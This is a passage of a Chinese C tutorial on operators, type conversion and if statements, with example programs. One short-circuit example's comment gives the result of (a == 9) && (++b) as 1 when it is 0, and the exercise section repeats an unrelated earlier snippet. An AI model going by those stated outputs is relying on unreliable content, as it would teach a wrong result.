<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"> <span class="comment">// 下列代码利用Qt运行时6, 利用Xcode运行是5</span></span><br><span class="line"> <span class="comment">// 但是无论如何, 最终a的值都是3</span></span><br><span class="line"><span class="comment">//  在C语言中这种代码没有意义, 不用深究也不要这样写</span></span><br><span class="line"><span class="comment">// 特点: 参与运算的是同一个变量, 参与运算时都做了自增自减操作, 并且在同一个表达式中</span></span><br><span class="line"> <span class="keyword">int</span> b = ++a + ++a;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;b = %i\n&quot;</span>, b); </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="sizeof运算符"><a href="#sizeof运算符" class="headerlink" title="sizeof运算符"></a>sizeof运算符</h2><ul>
<li><p>sizeof可以用来计算一个变量或常量、数据类型所占的内存字节数</p>
<ul>
<li>标准格式: sizeof(常量 or 变量);</li>
</ul>
</li>
<li><p>sizeof的几种形式</p>
<ul>
<li>sizeof( 变量\常量 );<ul>
<li>sizeof(10);</li>
<li>char c = ‘a’; sizeof(c);</li>
</ul>
</li>
<li>sizeof 变量\常量;<ul>
<li>sizeof 10;</li>
<li>char c = ‘a’; sizeof c;</li>
</ul>
</li>
<li>sizeof( 数据类型);<ul>
<li>sizeof(float);</li>
<li>如果是数据类型不能省略括号</li>
</ul>
</li>
</ul>
</li>
<li><p>sizeof面试题:</p>
<ul>
<li>sizeof()和+=、*=一样是一个复合运算符, 由sizeof和()两个部分组成, 但是代表的是一个整体</li>
<li>所以sizeof不是一个函数, 是一个运算符, 该运算符的优先级是2</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">3.14</span>;</span><br><span class="line">    <span class="comment">// 由于sizeof的优先级比+号高, 所以会先计算sizeof(a);</span></span><br><span class="line">    <span class="comment">// a是int类型, 所以占4个字节得到结果4</span></span><br><span class="line">    <span class="comment">// 然后再利用计算结果和b相加, 4 + 3.14 = 7.14</span></span><br><span class="line">    <span class="keyword">double</span> res = <span class="keyword">sizeof</span> a+b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res = %lf\n&quot;</span>, res); <span class="comment">// 7.14</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h2><ul>
<li>在C语言中逗号“,”也是一种运算符,称为逗号运算符。 其功能是把多个表达式连接起来组成一个表达式,称为逗号表达式</li>
<li>逗号运算符会从左至右依次取出每个表达式的值, 最后整个逗号表达式的值等于最后一个表达式的值</li>
<li>格式: 表达式1，表达式2，… …，表达式n;<ul>
<li>例如: int result = a+1,b=3*4;</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c;</span><br><span class="line">    <span class="comment">// ()优先级高于逗号运算符和赋值运算符, 所以先计算()中的内容</span></span><br><span class="line">    <span class="comment">// c = (11, 21);</span></span><br><span class="line">    <span class="comment">// ()中是一个逗号表达式, 结果是最后一个表达式的值, 所以计算结果为21</span></span><br><span class="line">    <span class="comment">// 将逗号表达式的结果赋值给c, 所以c的结果是21</span></span><br><span class="line">    c = (a + <span class="number">1</span>, b + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %i\n&quot;</span>, c); <span class="comment">// 21</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><ul>
<li>为什么要学习关系运算符<ul>
<li>默认情况下，我们在程序中写的每一句正确代码都会被执行。但很多时候，我们想在某个条件成立的情况下才执行某一段代码</li>
<li>这种情况的话可以使用条件语句来完成，但是学习条件语句之前，我们先来看一些更基础的知识：如何判断一个条件是否成立</li>
</ul>
</li>
</ul>
<p>C语言中的真假性</p>
<ul>
<li><p>在C语言中，条件成立称为“真”，条件不成立称为“假”，因此，判断条件是否成立，就是判断条件的“真假”</p>
</li>
<li><p>怎么判断真假呢？C语言规定，任何数值都有真假性，任何非0值都为“真”，只有0才为“假”。也就是说，108、-18、4.5、-10.5等都是“真”，0则是“假”<br><img src="/2022/01/15/C/bca554bbef13027b7dabc1bb67f47a6d.png" alt="img"></p>
</li>
<li><p>关系运算符的运算结果只有2种：如果条件成立，结果就为1，也就是“真”；如果条件不成立，结果就为0，也就是“假”</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>优先级</strong></th>
<th align="center"><strong>名称</strong></th>
<th align="center"><strong>符号</strong></th>
<th align="center"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">6</td>
<td align="center">大于运算符</td>
<td align="center">&gt;</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">小于运算符</td>
<td align="center">&lt;</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">大于等于运算符</td>
<td align="center">&gt;=</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">小于等于运算符</td>
<td align="center">&lt;=</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">等于运算符</td>
<td align="center">==</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">不等于运算符</td>
<td align="center">!=</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">10</span> &gt; <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    result = <span class="number">5</span> &lt; <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    result = <span class="number">5</span> &gt; <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">    result = <span class="number">10</span> &gt;= <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    result = <span class="number">10</span> &lt;= <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    result = <span class="number">10</span> == <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    result = <span class="number">10</span> != <span class="number">9</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>优先级和结合性</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// == 优先级 小于 &gt;, 所以先计算&gt;</span></span><br><span class="line">    <span class="comment">// result = 10 == 1; result = 0;</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">10</span> == <span class="number">5</span> &gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// == 和 != 优先级一样, 所以按照结合性</span></span><br><span class="line">    <span class="comment">// 关系运算符是左结合性, 所以从左至右计算</span></span><br><span class="line">    <span class="comment">// result = 0 != 3; result = 1;</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">10</span> == <span class="number">5</span> != <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>无论是float还是double都有精度问题, 所以一定要避免利用==判断浮点数是否相等</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">float</span> b = a * <span class="number">10</span> + <span class="number">0.00000000001</span>;</span><br><span class="line">    <span class="keyword">double</span> c = <span class="number">1.0</span> + + <span class="number">0.00000000001</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %f\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = %f\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">int</span> result = b == c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table>
<thead>
<tr>
<th align="center">优先级</th>
<th align="center"><strong>名称</strong></th>
<th align="center"><strong>符号</strong></th>
<th align="center"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">2</td>
<td align="center">逻辑非运算符</td>
<td align="center">!</td>
<td align="center">单目运算符,具有右结合性</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">逻辑与运算符</td>
<td align="center">&amp;&amp;</td>
<td align="center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">逻辑或运算符</td>
<td align="center">||</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li>逻辑非<ul>
<li>格式: <code>! 条件A;</code></li>
<li>运算结果: 真变假,假变真</li>
<li>运算过程:<ul>
<li>先判断条件A是否成立，如果添加A成立, 那么结果就为0，即“假”；</li>
<li>如果条件A不成立，结果就为1，即“真”</li>
</ul>
</li>
<li>使用注意:<ul>
<li>可以多次连续使用逻辑非运算符</li>
<li>!!!0;相当于(!(!(!0)));最终结果为1</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// ()优先级高, 先计算()里面的内容</span></span><br><span class="line">    <span class="comment">// 10==10为真, 所以result = !(1);</span></span><br><span class="line">    <span class="comment">// !代表真变假, 假变真,所以结果是假0</span></span><br><span class="line">    <span class="keyword">int</span> result = !(<span class="number">10</span> == <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>逻辑与<ul>
<li>格式: <code>条件A &amp;&amp; 条件B;</code></li>
<li>运算结果:一假则假</li>
<li>运算过程:<ul>
<li>总是先判断”条件A”是否成立</li>
<li>如果”条件A”成立，接着再判断”条件B”是否成立, 如果”条件B”也成立，结果就为1，即“真”</li>
<li>如果”条件A”成立，”条件B”不成立，结果就为0，即“假”</li>
<li>如果”条件A”不成立，不会再去判断”条件B”是否成立, 因为逻辑与只要一个不为真结果都不为真</li>
</ul>
</li>
<li>使用注意:<ul>
<li>“条件A”为假, “条件B”不会被执行</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//               真     &amp;&amp;    真</span></span><br><span class="line">    <span class="keyword">int</span> result = (<span class="number">10</span> == <span class="number">10</span>) &amp;&amp; (<span class="number">5</span> != <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">//          假     &amp;&amp;    真</span></span><br><span class="line">    result = (<span class="number">10</span> == <span class="number">9</span>) &amp;&amp; (<span class="number">5</span> != <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">//          真     &amp;&amp;    假</span></span><br><span class="line">    result = (<span class="number">10</span> == <span class="number">10</span>) &amp;&amp; (<span class="number">5</span> != <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">//          假     &amp;&amp;    假</span></span><br><span class="line">    result = (<span class="number">10</span> == <span class="number">9</span>) &amp;&amp; (<span class="number">5</span> != <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// 逻辑与, 前面为假, 不会继续执行后面</span></span><br><span class="line">    <span class="keyword">int</span> result = (a == <span class="number">9</span>) &amp;&amp; (++b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %i\n&quot;</span>, b); <span class="comment">// 20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>逻辑或<ul>
<li>格式: <code>条件A || 条件B;</code></li>
<li>运算结果:一真则真</li>
<li>运算过程:<ul>
<li>总是先判断”条件A”是否成立</li>
<li>如果”条件A”不成立，接着再判断”条件B”是否成立, 如果”条件B”成立，结果就为1，即“真”</li>
<li>如果”条件A”不成立，”条件B”也不成立成立, 结果就为0，即“假”</li>
<li>如果”条件A”成立, 不会再去判断”条件B”是否成立, 因为逻辑或只要一个为真结果都为真</li>
</ul>
</li>
<li>使用注意:<ul>
<li>“条件A”为真, “条件B”不会被执行</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//               真     ||    真</span></span><br><span class="line">    <span class="keyword">int</span> result = (<span class="number">10</span> == <span class="number">10</span>) || (<span class="number">5</span> != <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">//          假     ||    真</span></span><br><span class="line">    result = (<span class="number">10</span> == <span class="number">9</span>) || (<span class="number">5</span> != <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">//          真     ||    假</span></span><br><span class="line">    result = (<span class="number">10</span> == <span class="number">10</span>) || (<span class="number">5</span> != <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">//          假     ||    假</span></span><br><span class="line">    result = (<span class="number">10</span> == <span class="number">9</span>) || (<span class="number">5</span> != <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// 逻辑或, 前面为真, 不会继续执行后面</span></span><br><span class="line">    <span class="keyword">int</span> result = (a == <span class="number">10</span>) || (++b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %i\n&quot;</span>, result); <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b = %i\n&quot;</span>, b); <span class="comment">// 20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><ul>
<li>三目运算符，它需要3个数据或表达式构成条件表达式</li>
<li>格式: <code>表达式1？表达式2(结果A)：表达式3(结果B)</code><ul>
<li>示例: <code>考试及格 ? 及格 : 不及格;</code><br><img src="https://img-blog.csdnimg.cn/img_convert/47bcf1ddf7899400abb76c917b613962.png" alt="img"></li>
</ul>
</li>
<li>求值规则:<ul>
<li>如果”表达式1”为真，三目运算符的运算结果为”表达式2”的值(结果A)，否则为”表达式3”的值(结果B)</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">示例:</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> max = (a &gt; b) ? a : b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %d&quot;</span>, max);</span><br><span class="line">    输出结果: <span class="number">20</span></span><br><span class="line">等价于:</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">      max=a;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">       max=b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %d&quot;</span>, max);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>注意点<ul>
<li>条件运算符的运算优先级低于关系运算符和算术运算符,但高于赋值符</li>
<li>条件运算符?和:是一个整体,不能分开使用</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 先计算 a &gt; b</span></span><br><span class="line">    <span class="comment">// 然后再根据计算结果判定返回a还是b</span></span><br><span class="line">    <span class="comment">// 相当于int max= (a&gt;b) ? a : b;</span></span><br><span class="line">    <span class="keyword">int</span> max= a&gt;b ? a : b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max = %i\n&quot;</span>, max); <span class="comment">// 10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 结合性是从右至左, 所以会先计算:后面的内容</span></span><br><span class="line">    <span class="comment">// int res = a&gt;b?a:(c&gt;d?c:d);</span></span><br><span class="line">    <span class="comment">// int res = a&gt;b?a:(20&gt;10?20:10);</span></span><br><span class="line">    <span class="comment">// int res = a&gt;b?a:(20);</span></span><br><span class="line">    <span class="comment">// 然后再计算最终的结果</span></span><br><span class="line">    <span class="comment">// int res = 10&gt;5?10:(20);</span></span><br><span class="line">    <span class="comment">// int res = 10;</span></span><br><span class="line">    <span class="keyword">int</span> res = a&gt;b?a:c&gt;d?c:d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res = %i\n&quot;</span>, res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><table>
<thead>
<tr>
<th align="center"><strong>强制类型转换(显示转换)</strong></th>
<th align="center"><strong>自动类型转换(隐式转换)</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">(需要转换的类型)(表达式)</td>
<td align="center">1.算数转换 2.赋值转换</td>
</tr>
</tbody></table>
<ul>
<li>强制类型转换(显示转换)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将double转换为int</span></span><br><span class="line"><span class="keyword">int</span> a = (<span class="keyword">int</span>)<span class="number">10.5</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>算数转换<ul>
<li>系统会自动对占用内存较少的类型做一个“自动类型提升”的操作, 先将其转换为当前算数表达式中占用内存高的类型, 然后再参与运算</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前表达式用1.0占用8个字节, 2占用4个字节</span></span><br><span class="line"><span class="comment">// 所以会先将整数类型2转换为double类型之后再计算</span></span><br><span class="line"><span class="keyword">double</span> b = <span class="number">1.0</span> / <span class="number">2</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>赋值转换</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 赋值时左边是什么类型,就会自动将右边转换为什么类型再保存</span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10.6</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>参与计算的是什么类型, 结果就是什么类型</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 结果为0, 因为参与运算的都是整型</span></span><br><span class="line"><span class="keyword">double</span> a = (<span class="keyword">double</span>)(<span class="number">1</span> / <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 结果为0.5, 因为1被强制转换为了double类型, 2也会被自动提升为double类型</span></span><br><span class="line"><span class="keyword">double</span> b = (<span class="keyword">double</span>)<span class="number">1</span> / <span class="number">2</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>类型转换并不会影响到原有变量的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> d = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">int</span> num = (<span class="keyword">int</span>)d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num = %i\n&quot;</span>, num); <span class="comment">// 3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d = %lf\n&quot;</span>, d); <span class="comment">// 3.140000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="阶段练习"><a href="#阶段练习" class="headerlink" title="阶段练习"></a>阶段练习</h2><ul>
<li>从键盘输入一个整数, 判断这个数是否是100到200之间的数</li>
<li>表达式 6＝＝6＝＝6 的值是多少？</li>
<li>用户从键盘上输入三个整数,找出最大值,然后输入最大值</li>
<li>用两种方式交换两个变量的保存的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> d = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">int</span> num = (<span class="keyword">int</span>)d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num = %i\n&quot;</span>, num); <span class="comment">// 3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d = %lf\n&quot;</span>, d); <span class="comment">// 3.140000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="流程控制基本概念"><a href="#流程控制基本概念" class="headerlink" title="流程控制基本概念"></a>流程控制基本概念</h2><ul>
<li>默认情况下程序运行后，系统会按书写顺序从上至下依次执行程序中的每一行代码。但是这并不能满足我们所有的开发需求, 为了方便我们控制程序的运行流程，C语言提供3种流程控制结构，不同的流程控制结构可以实现不同的运行流程。</li>
<li>这3种流程结构分别是顺序结构、选择结构、循环结构</li>
<li>顺序结构:<ul>
<li>按书写顺序从上至下依次执行<br><img src="https://img-blog.csdnimg.cn/img_convert/9071191723644a2b0364126c8a5bd65f.png" alt="img"></li>
</ul>
</li>
<li>选择结构<ul>
<li>对给定的条件进行判断，再根据判断结果来决定执行代码<br><img src="https://img-blog.csdnimg.cn/img_convert/0e8b2f8b6230aedf754eab312605ce23.png" alt="img"><br><img src="https://img-blog.csdnimg.cn/img_convert/e4452dcd9857466ecc0957fb4453b3a3.png" alt="img"></li>
</ul>
</li>
<li>循环结构<ul>
<li>在给定条件成立的情况下，反复执行某一段代码<br><img src="/2022/01/15/C/4899d440537583bc28f3bc17bd2b7ae1.png" alt="img"><br><img src="/2022/01/15/C/3f74e2788a1ccbaf1028b1360c514c70.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><ul>
<li>C语言中提供了两大选择结构, 分别是if和switch<br>##选择结构if</li>
<li>if第一种形式<ul>
<li>表示如果表达式为真,执行语句块1,否则不执行</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式) &#123;</span><br><span class="line">  语句块<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">后续语句;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(age &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;结婚\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;谈恋爱\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>if第二种形式<ul>
<li>如果表达式为真,则执行语句块1,否则执行语句块2</li>
